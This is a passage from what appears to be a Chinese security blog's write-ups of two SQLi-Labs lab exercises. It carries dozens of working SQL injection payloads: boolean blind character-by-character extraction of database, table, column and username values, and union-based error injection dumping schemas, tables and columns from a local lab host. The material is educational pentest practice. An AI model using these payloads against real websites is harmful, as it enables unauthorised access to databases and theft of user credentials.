class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(version(),1)>=5--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/获取数据库版本信息.png" alt="获取数据库版本信息"></center></li><li><p>爆数据库名称的长度。由上述操作得知MySQL的版本为<code>5.0</code>或高于<code>5.0</code>版本，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆当前数据库名称的长度，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length(database())>1--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length(database())>10--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length(database())>5--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length(database())>8--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length(database())>7--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/判断数据库长度是否大于8.png" alt="判断数据库长度是否大于8"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/判断数据库长度是否大于7.png" alt="判断数据库长度是否大于7"></center><p>由上述操作得知当前数据库命长长度为：<code>8</code>。</p></li><li><p>爆数据库名称。在得到数据库名称长度后，可以还需要爆数据库的名称。使用如下所示的payload可以爆出当前数据库名称的首字母，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)>'a'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)>'z'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)>'m'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)>'s'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)>'p'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)>'q'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)>'r'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/数据库名称首字母是否大于s.png" alt="数据库名称首字母是否大于s"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/数据库名称首字母是否大于r.png" alt="数据库名称首字母是否大于r"></center><p>由上述操作得知当前数据库首字母为：<code>s</code>。</p><p>接着还需要爆数据库名称中其他位置的字符，数据库名称为<code>security</code>如下所示payload可逐个测试。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),1)='s'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),2)='se'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),3)='sec'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),4)='secu'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),5)='secur'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),6)='securi'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),7)='securit'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and left(database(),8)='security'--+</span></code></pre><p>注：</p><ul><li><font color="blue">在正常测试中还是需要使用二分法，逐个逐位测试。</font></li></ul></li><li><p>爆数据表名称。在得到数据库名称后，还需要继续爆数据库中的数据表名称，在爆破表名称长度之前通常会先爆破数据表名称的长度。</p><p>爆<code>security</code>数据库中第一个数据表名称的长度。使用如下payload，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>1--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>10--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>5--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>8--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>6--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/判断数据表名称是否大于5位.png" alt="判断数据表名称是否大于5位"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/判断数据表名称是否大于6位.png" alt="判断数据表名称是否大于6位"></center><p>由上述操作得知第一张数据表名称的长度为：<code>6</code>位。</p><p>逐位爆第一张数据表名称。使用如下所示payload，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否大于a</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97--+</span><span class="token comment" spellcheck="true">-- 是否大于z</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>122--+</span><span class="token comment" spellcheck="true">-- 是否大于m</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>109--+</span><span class="token comment" spellcheck="true">-- 是否大于g</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103--+</span><span class="token comment" spellcheck="true">-- 是否大于d</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100--+</span><span class="token comment" spellcheck="true">-- 是否大于e</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>101--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/第一张表名的首字母是否大于d.png" alt="第一张表名的首字母是否大于d"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/第一张表名的首字母是否大于e.png" alt="第一张表名的首字母是否大于e"></center><p>由上述操作可以第一张表的首字母为：<code>e</code>。还需要继续爆破数据表名称中其他字符，第一张表名为：<code>emails</code>，使用如下payload可对数据表名进行测试。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第二位：m</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+</span><span class="token comment" spellcheck="true">-- 第三位：a</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=97--+</span><span class="token comment" spellcheck="true">-- 第四位：i</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))=105--+</span><span class="token comment" spellcheck="true">-- 第五位：l</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=108--+</span><span class="token comment" spellcheck="true">-- 第六位：s</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))=115--+</span></code></pre><p>在对第一张表名爆破成功后，还需要对后续的数据表名进行爆破，使用如下所示的payload可以对后面的表进行爆破：</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">---------------------- 第二张表：referers -----------------------------</span><span class="token comment" spellcheck="true">-- 第二张表第一位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+</span><span class="token comment" spellcheck="true">-- 第二张表第二位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=101--+</span><span class="token comment" spellcheck="true">-- 第二张表第三位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),3,1))=102--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">-- 第二张表第八位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),8,1))=115--+</span><span class="token comment" spellcheck="true">------------------------------------------------------------------------</span><span class="token comment" spellcheck="true">---------------------- 第三张表：uagents -----------------------------</span><span class="token comment" spellcheck="true">-- 第三张表第一位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))=117--+</span><span class="token comment" spellcheck="true">-- 第三张表第二位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),2,1))=97--+</span><span class="token comment" spellcheck="true">-- 第三张表第三位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),3,1))=103--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">-- 第三张表第七位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),7,1))=115--+</span><span class="token comment" spellcheck="true">------------------------------------------------------------------------</span><span class="token comment" spellcheck="true">---------------------- 第四张表：users -----------------------------</span><span class="token comment" spellcheck="true">-- 第四张表第一位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117--+</span><span class="token comment" spellcheck="true">-- 第四张表第二位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115--+</span><span class="token comment" spellcheck="true">-- 第四张表第三位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),3,1))=101--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">-- 第四张表第五位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5,1))=115--+</span><span class="token comment" spellcheck="true">------------------------------------------------------------------------</span></code></pre><p>由上述操作得知，<code>security</code>数据库中存在的数据表有：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>。</p><p>注：</p><ul><li><p>如何判断数据表名称列举完？如下payload可以完成测试</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1),1,1))>0--+</span></code></pre></li></ul></li><li><p>爆数据表列名。在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中第一个列名的长度，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>1--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>3--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>2--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/第一个列名长度.png" alt="第一个列名长度"></center><p>利用<code>regexp</code>获取<code>user</code>表中的列。使用如下的payload，快速猜测数据表中是否存在与模式相匹配的列名，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否存在以us开头的列名</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+</span><span class="token comment" spellcheck="true">-- 是否存在username开头的列名</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+</span><span class="token comment" spellcheck="true">-- 是否存在password开头的列名</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 0,1)--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/是否存在以username开头的列名.png" alt="是否存在以username开头的列名"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/是否存在以password开头的列名.png" alt="是否存在以password开头的列名"></center></li><li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出<code>users</code>表中第一条数据的<code>username</code>值，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第一位：D</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+</span><span class="token comment" spellcheck="true">-- 第二位：u</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),2,1))=117--+</span><span class="token comment" spellcheck="true">-- 第三位：m</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),3,1))=109--+</span><span class="token comment" spellcheck="true">-- 第四位：b</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),4,1))=98--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/判断字段值第一位是否为D.png" alt="判断字段值第一位是否为D"></center></li></ol><h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个没有错误回显的字符型注入，但是可以通过爆破猜解逐个逐位猜出数据库名称、数据表名称、数据表列名、数据表字段值等信息。最终目的是得到一组用户名及其密码。</p><ul><li>HTTP请求为：<code>GET</code></li><li>参数格式为：<code>select * from users where id=&#39;参数&#39;;</code></li><li>未进行转义、过滤等</li><li>可使用单引号判断注入类型</li><li>可以通过返回信息不同，判断注入是否成功</li></ul><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p></li><li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之GET-ErrorBased-DoubleQuotes-String</title>
      <link href="/2020/10/18/sql-zhu-ru-zhi-get-errorbased-doublequotes-string/"/>
      <url>/2020/10/18/sql-zhu-ru-zhi-get-errorbased-doublequotes-string/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p><p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、字符型注入。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>服务器系统：<code>Windows Server 2008</code></li><li>中间件：<code>IIS</code></li><li>数据库：<code>MySQL</code></li><li>客户机：<code>Windows 10</code></li><li>靶机：<code>SQLi-Labs</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/实验界面.png" alt="实验界面"></center><h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 注入步骤</h1><ol><li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li><li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="0x05-实验步骤"><a href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-4/index.php?id=1</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/正常访问结果显示.png" alt="正常访问结果显示"></center></li><li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>10.10.10.148:86/Less-4/index.php?id=1&#39;</code>，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/单引号测试结果.png" alt="单引号测试结果"></center></li><li><p>由上图中的信息无法判断出单引号是被过滤还是被转义或者忽略，因此在浏览器地址栏中输入：<code>http://10.10.10.148:86/Less-4/index.php?id=1&quot;</code>进行双引号测试，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/双引号测试结果.png" alt="双引号测试结果"></center></li><li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=(&quot;参数&quot;) limit 0，1;</code>，<font color="red">参数为<code>String</code>型而且SQL语句中使用双引号(<code>&quot;</code>)和圆括号界定该参数</font>。因此，我们可以构造的恒真语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">") or ("</span><span class="token number">1</span><span class="token string">")=("</span><span class="token number">1</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>其中<code>1&quot;) or (&quot;1&quot;)=(&quot;1</code>payload的操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/or恒真测试.png" alt="payload恒真测试"/"></center></li><li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 1操作结果.png" alt="order by 1操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 2操作结果.png" alt="order by 2操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 3操作结果.png" alt="order by 3操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/order by 4操作结果.png" alt="order by 4操作结果"></center></li><li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,2,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/union select语句判断SQL回显位置.png" alt="union select语句判断SQL回显位置"></center><p>注：</p><ul><li>使用<code>union</code>进行联合查询是想要查询的数据回显，则需要第一个查询结果为空。</li></ul></li><li><p>使用<code>user()、database()、version()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 获取当前用户信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,user(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库名称</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,database(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,version(),3--+</span><span class="token comment" spellcheck="true">-- 获取数据库的路径信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,@@datadir,3--+</span><span class="token comment" spellcheck="true">-- 获取当前系统的版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,@@version_compile_os,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取数据库用户信息.png" alt="获取数据库用户信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取当前数据库名称.png" alt="获取当前数据库名称"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取数据库版本信息.png" alt="获取数据库版本信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取当前数据库所在路径.png" alt="获取当前数据库所在路径"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/获取服务器版本信息.png" alt="获取服务器版本信息"></center></li><li><p>由上述操作得知MySQL的版本为：<code>5.1.73</code>，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆MySQL中所有数据库名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆出所有数据库名称.png" alt="爆出所有数据库名称"></center></li><li><p>在得到数据库名称后，可以继续爆数据库中的数据表，使用如下所示的payload可以爆出<code>security</code>数据库中所有的数据表名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆出security数据库的所有表名.png" alt="爆出security数据库的所有表名"></center></li><li><p>在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中所有的列名，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</span></code></pre><center><img 